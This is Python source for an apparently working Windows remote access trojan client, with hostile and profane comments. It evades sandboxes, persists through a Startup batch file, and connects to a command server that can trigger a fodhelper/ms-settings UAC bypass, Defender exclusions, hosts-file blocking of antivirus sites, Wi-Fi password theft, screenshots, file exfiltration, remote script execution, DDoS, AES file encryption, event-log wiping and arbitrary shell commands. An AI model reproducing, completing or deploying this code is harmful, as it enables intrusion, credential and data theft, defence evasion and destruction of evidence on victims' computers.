# Import basics
import platform
import time
import getpass
import os
import subprocess
import base64
import json
import ctypes
import sys
import logging
import psutil
import unicodedata
import re
import atexit
import threading
import time
import socket

# Import intermediate goods
from typing import Tuple
from urllib.request import urlopen
from PIL import ImageGrab
from scapy.all import ARP, Ether, srp

# Import crypto
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes

# Import Xenophobia
from mods.AVlist import avList
from mods.JancoAPI import *
from mods.PyVM import *
from mods.brute import *

# Small study time before final exam
sleep(10.3)

# Final Exam time
try:
    kerpy = Kerpy()
    kerpy.registry_check()
    kerpy.processes_and_files_check()
    kerpy.PysilonCheck()
    kerpy.mac_check()
    kerpy.check_pc()
    kerpy.hwid_vm()
    kerpy.checkgpu()
    kerpy.check_ip()
    kerpy.profiles()
    print("You passed")
except Exception as e:
    print(f'Nah , this shit failed {e}')


# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configure auto
cdir = os.getcwd()  
usern = getpass.getuser()
file_name = get_current_file_name()

# Configure settings
########################################
softdir = 'System64'                  ##
host = '127.0.0.1'                    ##
port = 12345                          ##
key = 'Riot'                          ##
Jabber = float(5)                     ## 
########################################

# Startup
first_run = True

install_directory_raw = ['C:', 'Users', usern, softdir] ; install_directory = os.path.join(*install_directory_raw); 
install_directory = install_directory.replace('C:', 'C:\\')
startup_path = f'C:\\Users\\{usern}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
shortcut_path = f'C:\\Users\\{usern}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\starts.bat'
Userpath = f'C:\\Users\\{usern}\\Downloads\\Desktop'

# Shit stiirrrer
shortcut = f"""

cd {install_directory}
start {file_name}
exit

"""

# Goodbyeeee moonbeam
uninstall_script = f"""

@echo off

:: Specify the paths
set "{install_directory}"
set "{shortcut_path}"

:: Delete the folder and everything in it
if exist "%folder_to_delete%" (
    echo Deleting folder and its contents: %folder_to_delete%
    rmdir /S /Q "%folder_to_delete%"
) else (
    echo Folder not found: %folder_to_delete%
)

:: Delete the specified file
if exist "%file_to_delete%" (
    echo Deleting file: %file_to_delete%
    del /Q "%file_to_delete%"
) else (
    echo File not found: %file_to_delete%
)

:: Optionally delete the batch script itself after execution
set "script_path=%~f0"
if exist "%script_path%" (
    echo Deleting uninstall script: %script_path%
    del /Q "%script_path%"
)

echo Uninstallation completed.

"""


# Hello world , im going to drown you all
if install_directory == cdir:
    first_run = False

if first_run:
    move_current_file(install_directory)
    save_code_to_batch_and_run(shortcut, startup_path)
    sys.exit()

if not first_run:
    pass

# Alberto busta
class AV:
    def __init__(self):
        self.success = None
        self.error_message = None

    def run(self):
        try:
            call = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell=True, capture_output=True)
            if call.returncode != 0:
                hostdirpath = os.path.join("System32", "drivers", "etc")
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors="ignore").strip().splitlines()[-1].split()[-1].split(os.sep)[1:])

            hostfilepath = os.path.join(os.getenv("systemroot"), hostdirpath, "hosts")

            if not os.path.isfile(hostfilepath):
                self.success = False
                self.error_message = "Hosts file does not exist"
                return

            with open(hostfilepath) as file:
                data = file.readlines()

            BANNED_SITES = (
                "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", 
                "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", 
                "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", 
                "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", 
                "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", 
                "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com"
            )

            newdata = []
            for line in data:
                if any((site in line) for site in BANNED_SITES):
                    continue
                else:
                    newdata.append(line)

            for site in BANNED_SITES:
                newdata.append("\t0.0.0.0 {}".format(site))
                newdata.append("\t0.0.0.0 www.{}".format(site))

            newdata = "\n".join(newdata).replace("\n\n", "\n")

            subprocess.run(f"attrib -r {hostfilepath}", shell=True, capture_output=True)
            
            with open(hostfilepath, "w") as file:
                file.write(newdata)

            subprocess.run(f"attrib +r {hostfilepath}", shell=True, capture_output=True)
            
            self.success = True
            self.error_message = "Operation successful"

        except Exception as e:
            self.success = False
            self.error_message = str(e)

"""
WHY the fuck does the fuck monkeys at windows HQ 
Keep allowing this shit
Anyway if your analysising this , ill be nice , this is where the
High profile *dicks* get stabbed into the ground
"""

class UACBypass:
    def __init__(self):
        self.executable_path, self.is_frozen = self.get_self()

    def execute_command(self, cmd: str):
        return subprocess.run(cmd, shell=True, capture_output=True)

    def check_log_change(self, method: str) -> bool:
        log_cmd = 'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'
        log_count_before = len(self.execute_command(log_cmd).stdout)
        self.execute_command(f"{method} --nouacbypass")
        log_count_after = len(self.execute_command(log_cmd).stdout)
        return log_count_after > log_count_before

    def uac_bypass(self, method: int = 1) -> bool:
        if not self.is_frozen:
            return False

        reg_add_cmd = f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{self.executable_path}\" /f"
        reg_delete_cmd = "reg delete hkcu\\Software\\Classes\\ms-settings /f"
        
        self.execute_command(reg_add_cmd)
        self.execute_command("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
        
        if method == 1:
            if self.check_log_change("computerdefaults"):
                self.execute_command(reg_delete_cmd)
                return self.uac_bypass(method + 1)
        elif method == 2:
            if self.check_log_change("fodhelper"):
                self.execute_command(reg_delete_cmd)
                return self.uac_bypass(method + 1)
        else:
            return False
        
        self.execute_command(reg_delete_cmd)
        return True

    def is_admin(self) -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    def get_self(self) -> Tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    def doit(self):
        if not self.is_admin() and self.is_frozen and self.uac_bypass():
            os._exit(0)

# Check out the customer
def CheckAV() -> str:
    AVlist = avList
    running_processes = psutil.process_iter(attrs=['name'])
    detected_avs = set()

    for process in running_processes:
        process_name = process.info['name']
        if process_name in AVlist:
            detected_avs.add(AVlist[process_name])

    if detected_avs:
        print("Detected antivirus(es) running:")
        for av in detected_avs:
            print(av)
        return detected_avs
    else:
        print("No known antivirus detected running.")
        return "No known antivirus detected running."

def extract_wifi_passwords():
    # Get the list of saved Wi-Fi profiles
    profiles_data = subprocess.check_output("netsh wlan show profile", shell=True).decode('utf-8')
    
    profiles = []
    for line in profiles_data.splitlines():
        if "All User Profile" in line:
            # Extract the profile name
            profile_name = line.split(":")[1].strip()
            profiles.append(profile_name)

    wifi_info = {}

    for profile in profiles:
        # Get the key content (password) of each profile
        profile_info = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True).decode('utf-8')
        
        # Extract the password
        password_line = [line for line in profile_info.splitlines() if "Key Content" in line]
        if password_line:
            password = password_line[0].split(":")[1].strip()
        else:
            password = "No Password Found"
        
        wifi_info[profile] = password

    return wifi_info

# Dip the toes in the water
def get_system_info() -> str:
    """Gather system information."""
    cos = platform.system()
    vos = platform.version()
    fin = f"{cos} {vos}"

    try:
        ip1 = f"IP address: {urlopen('https://ident.me').read().decode('utf-8')} [ident.me]"
        ip2 = f"IP address: {urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8')} [lafibre.info]"
    except:
        ip1 = f"IP address: ??? [ident.me]"   
        ip2 = f"IP address: ??? [lafibre.info]"

    city, province, country = get_location()

    avs = CheckAV()
    avs2 = str(avs).replace('?', '').replace('{','').replace('}','').replace("'","").replace('!','').replace('0','').replace('1','').replace('2','').replace('3','').replace('4','').replace('5','').replace('6','').replace('7','').replace('8','').replace('9','')
    print(avs2)
    cleanavs = remove_non_ascii(avs2)
    
    scream = f"""
    New client:

    {ip1}
    {ip2}

    OS: {fin}

    location: {city}, {province}, {country}

    Current User: {usern}
    Current Directory: {cdir}

    Antivirus: {cleanavs}

    """
    return scream

# Jump in the water and choke them to death with the #Deap_throat
def deapthroat() -> str:
    scream =  get_system_info()
    system_info = force_decode(subprocess.run('systeminfo', capture_output=True, shell=True).stdout).strip().replace('\\xff', ' ')
    backman = f"""
    
    {scream}

    {system_info}

    """
    return backman

# Burn the drugs before the cops come
def clear_event_logs():
    try:
        # Get all event log names
        result = subprocess.run(['powershell', '-Command', 'Get-EventLog -LogName * | ForEach-Object { $_.Log }'], capture_output=True, text=True)
        log_names = result.stdout.splitlines()
        
        # Clear each event log
        for log in log_names:
            subprocess.run(['powershell', '-Command', f'Clear-EventLog -LogName {log}'], capture_output=True)
        
        print("All event logs have been cleared.")
    except Exception as e:
        print(f"An error occurred: {e}")

def Nuke_EventLogs(): # TATDTAtATATAT
    try:
        clear_event_logs()
    except:
        pass

# I think we should just be friends
def uninstall():
    try: 
        delete_all_except(file_name)
        delete_file(shortcut_path)
        Nuke_EventLogs()
        delete_self(file_name)
        sys.exit()
    except Exception as e:
        return e
 
def Download_file(url):
    old_path = os.getcwd()
    os.chdir(install_directory)
    os.system(f'curl -o -l {url}')
    os.chdir(old_path)

def Upload_file(path):
    url = upload_to_file_io(path)
    return url

def take_screenshot(save_path='screenshot.png'):
    # Take a screenshot
    screenshot = ImageGrab.grab()
    
    # Save the screenshot to the specified path
    screenshot.save(save_path)
    return save_path

def get_local_ip_and_subnet():
    # Get local IP address
    local_ip = socket.gethostbyname(socket.gethostname())
    
    # Extract the first three octets for the subnet
    subnet = '.'.join(local_ip.split('.')[:3]) + '.0/24'
    
    return subnet

def scan_network(ip_range):
    # Create an ARP request packet
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # Send the packet and receive the response
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Parse the response
    devices = []
    for element in answered_list:
        devices.append({'IP': element[1].psrc, 'MAC': element[1].hwsrc})
    
    return devices

def encrypt_file(file_path, key):
    """Encrypt a file using AES encryption."""
    # Generate a random initialization vector (IV)
    iv = os.urandom(16)
    
    # Create cipher object
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Read the file
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    
    # Pad the plaintext to be a multiple of the block size
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_plaintext = padder.update(plaintext) + padder.finalize()
    
    # Encrypt the padded plaintext
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
    
    # Write the IV and ciphertext to a new file
    with open(file_path + '.enc', 'wb') as enc_file:
        enc_file.write(iv + ciphertext)
    
    return(f"File encrypted and saved as {file_path}.enc")

def decrypt_file(encrypted_file_path, key):
    """Decrypt an AES-encrypted file."""
    # Read the IV and ciphertext from the encrypted file
    with open(encrypted_file_path, 'rb') as enc_file:
        iv = enc_file.read(16)
        ciphertext = enc_file.read()
    
    # Create cipher object
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    
    # Decrypt the ciphertext
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    
    # Unpad the plaintext
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
    
    # Write the decrypted file
    decrypted_file_path = encrypted_file_path.rsplit('.', 1)[0]
    with open(decrypted_file_path, 'wb') as file:
        file.write(plaintext)
    
    return(f"File decrypted and saved as {decrypted_file_path}")

# Piano
def handle_command(command: str, client_socket: socket.socket, Jabber):
    if command == "Troll":
        sleep(Jabber)
        troll()
    elif command == "Scan deap":
        sleep(Jabber)
        info = deapthroat()
        client_socket.send(info.encode('ascii'))
    elif command == "Scan light":
        sleep(Jabber)
        info = get_system_info()
        client_socket.send(info.encode('ascii'))
    elif command == "Disable Network":
        sleep(Jabber)
        while True:
            os.system("ipconfig /release")
    elif command.startswith("Bypass UAC"):
        sleep(Jabber)
        uac_bypass = UACBypass()
        uac_bypass.doit()
        if uac_bypass.is_admin():
            client_socket.send("Admin Bypassed Successfully".encode('ascii'))
        else:
            client_socket.send("Admin Bypass Failed".encode('ascii'))
    elif command.startswith("Bypass AV"):
        sleep(Jabber)
        uac_bypass = UACBypass()
        if uac_bypass.is_admin():
            exclusion_paths = [os.getcwd()]
            for path in exclusion_paths:
                try:
                    subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
                    client_socket.send("Defender Bypassed Successfully".encode('ascii'))
                except Exception as e:
                    logging.error(f"Error bypassing defender: {e}")
                    client_socket.send("Defender Bypass Failed".encode('ascii'))
            blocker = AV()
            blocker.run()
        
            if blocker.success:
                client_socket.send("AV site Bypass Failed".encode('ascii'))
            else:
                print(f"AV site Bypasss failed with error: {blocker.error_message}")
        
        else:
            client_socket.send("You need admin to bypass AV".encode('ascii'))
    elif command.startswith("Bypass ALL") or command.startswith("Bypass All"):
        sleep(Jabber)
        uac_bypass = UACBypass()
        uac_bypass.doit()
        if uac_bypass.is_admin():
            client_socket.send("Admin Bypassed Successfully".encode('ascii'))
            exclusion_paths = [os.getcwd()]
            for path in exclusion_paths:
                try:
                    subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
                    client_socket.send("Defender Bypassed Successfully".encode('ascii'))
                except Exception as e:
                    logging.error(f"Error bypassing defender: {e}")
                    client_socket.send("Defender Bypass Failed".encode('ascii'))
            blocker = AV()
            blocker.run()
        else:
            client_socket.send("Admin Bypass Failed, stopping...".encode('ascii'))
    elif command.startswith("Uninstall"):
        sleep(Jabber)
        try:
            e = uninstall()
            client_socket.send(f"Failed to Uninstall {e}".encode('ascii'))
        except Exception as e:
            client_socket.send(f"Failed to Uninstall {e}".encode('ascii'))

    elif command.startswith("Clear Logs"):
        sleep(Jabber)
        uac_bypass = UACBypass()
        if uac_bypass.is_admin():
            clear_event_logs()
            client_socket.send("Cleared".encode('ascii'))
        else:
            client_socket.send("Need admin to clear event logs".encode('ascii'))

    elif command.startswith("download"):
        sleep(Jabber)
        try:
            scommand = command.split()
            url = scommand[1] #MF THE INDEX STARTS AT 0
            client_socket.send(f"Url {url}".encode('ascii'))
            try:
                Download_file(url)
            except Exception as e:
                client_socket.send(f"Error downloading file: {e}".encode('ascii'))
        except Exception as e:
            client_socket.send(f"Error reading url: {e}".encode('ascii'))
    elif command.startswith("upload"):
        sleep(Jabber)
        try:
            scommand = command.split()
            path = scommand[1] #MF THE INDEX STARTS AT 0
            client_socket.send(f"Path {path}".encode('ascii'))
            try:
                url = Upload_file(path)
                client_socket.send(f"Url {url}".encode('ascii'))
            except Exception as e:
                client_socket.send(f"Error uploading file: {e}".encode('ascii'))
        except Exception as e:
            client_socket.send(f"Error reading path: {e}".encode('ascii'))
    elif command.startswith("ss") or command.startswith("screenshot"):
        sleep(Jabber)
        try:
            r = take_screenshot()
            d = Upload_file(r)
            os.remove(r)
            client_socket.send(f'Upload url: {d}'.encode('ascii'))
        except Exception as e:
            client_socket.send(f'Error taking screenshot: {e}'.encode('ascii'))
    elif command.startswith("wallpaper"):
        sleep(Jabber)
        try:
            scommand = command.split()
            url = scommand[1]
            change_wallpaper_from_url(url)
        except Exception as e:
            client_socket.send(f'Error changing wallpaper: {e}'.encode('ascii'))
    elif command.startswith("ddos"):
        sleep(Jabber)
        try:
            scommand = command.split()
            url = scommand[1]
            port = scommand[2]
            threads = scommand[3]
            ddos(url, port, threads)
        except Exception as e:
            client_socket.send(f'Error changing wallpaper: {e}'.encode('ascii'))
    elif command.startswith("script"):
        sleep(Jabber)
        try:
            scommand = command.split()
            url = scommand[1]
            exec_github_script(url)
            client_socket.send(f'Executed {url}'.encode('ascii'))
        except Exception as e:
            client_socket.send(f'Error executing script: {e}'.encode('ascii'))
    elif command.startswith("Stealer"):
        sleep(Jabber)
        try:
            client_socket.send("Starting Stealer".encode('ascii'))
            client_socket.send("Coming soon".encode('ascii'))
        except:
            client_socket.send("Error".encode('ascii'))
    elif command.startswith("netscan"):
        sleep(Jabber)
        devices_list = []
        client_socket.send('Starting network scan...'.encode('ascii'))
        ip_range = get_local_ip_and_subnet()
        devices = scan_network(ip_range)
        for device in devices:
            devices_list.append(f"IP: {device['IP']}, MAC: {device['MAC']}")
        client_socket.send("\n".join(devices_list).encode('ascii'))

    elif command.startswith("encrypt"):
        sleep(Jabber)
        # Encrypts a single file by path using AES
        scommand = command.split()
        file_path = scommand[1]
        key = b'\x15\xf0\xba\xdb\x1f\xac7\x18\x9d\xed7\xa7v\x9d\xbc\xca\xe7\xf1\xfe\x1d\x1f\xfb/!\xe2\x96;\x8d\x97\x06\xae\x98'
        try:
            encrypt_file(file_path, key)
            client_socket.send(f'Encrypted {file_path}'.encode('ascii'))
        except Exception as e:
            client_socket.send(f'Error encrypting {file_path}: {e}'.encode('ascii'))
    elif command.startswith("decrypt"):
        sleep(Jabber)
        # Decrypts a single file by path using AES
        scommand = command.split()
        file_path = scommand[1]
        key = b'\x15\xf0\xba\xdb\x1f\xac7\x18\x9d\xed7\xa7v\x9d\xbc\xca\xe7\xf1\xfe\x1d\x1f\xfb/!\xe2\x96;\x8d\x97\x06\xae\x98'
        try:
            decrypt_file(file_path, key)
            client_socket.send(f'Decrypted {file_path}'.encode('ascii'))
        except Exception as e:
            client_socket.send(f'Error decrypting {file_path}: {e}'.encode('ascii'))
    # I WILL NEVER ADD AN HELP OR EXIT COMMAND IN THIS FILE
    elif command.startswith("Jabber"):
        # Change the Jabber variable (delay between actions)
        scommand = command.split()
        delay = scommand[1]
        try:
            Jabber = float(delay)
            client_socket.send(f'Jabber variable set to {Jabber}'.encode('ascii'))
        except Exception as e:
            client_socket.send(f'Error setting Jabber variable: {e}'.encode('ascii'))
    else:
        sleep(Jabber)
        feedbackraw = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip().replace('\\xff', ' ')
        feedback = f"Output: {feedbackraw}"
        client_socket.send(feedback.encode('ascii'))

# Wiggle the fat ass arround
def start_client():
    """Start the client and connect to the server."""
    scream = get_system_info()
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))
            logging.info("Connected to server")

            # Send initial greeting message
            client_socket.send(key.encode('ascii'))
            sleep(2)
            client_socket.send(scream.encode('ascii'))

            while True:
                response = client_socket.recv(1024).decode('ascii')
                logging.info(f"Received from server: {response}")
                handle_command(response, client_socket, Jabber=Jabber)
                
            #client_socket.close()
            #break
        
        except (ConnectionRefusedError, socket.error) as e:
            logging.error(f"Failed to connect to the server: {e}. Retrying in 5 seconds...")
            sleep(5)

def main():
    start_client()

# Start the fucking fat ass american
if __name__ == "__main__":
    main()
